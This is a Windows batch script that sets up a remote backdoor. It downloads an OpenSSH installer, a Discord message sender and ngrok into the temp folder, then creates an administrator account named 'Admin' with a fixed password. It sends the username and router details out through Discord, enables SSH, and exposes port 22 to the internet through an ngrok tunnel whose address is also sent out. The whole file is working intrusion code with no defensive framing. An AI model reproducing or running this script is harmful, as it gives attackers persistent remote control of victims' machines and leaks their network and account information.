C:
cd %temp%

curl https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/OpenSSH.ps1 -o OpenSSH.ps1
curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o source.bat
curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip

set ""

:: router info command
curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & router>router.txt & Source.bat +silent --file %temp%/router.txt

net user "Admin" "Administrator" /add
net localgroup Administrators Admin /add
net localgroup Administratorzy Admin /add
net localgroup Administración  Admin /add

whoami>user.txt
Source.bat +silent --file %temp%/user.txt
powershell ./OpenSSH.ps1

tar -xf ngrok.zip
start timeout 5 & Source.bat +silent --file %temp%/ngrok.log
ngrok.exe tcp 22 -log=stdout > ngrok.log

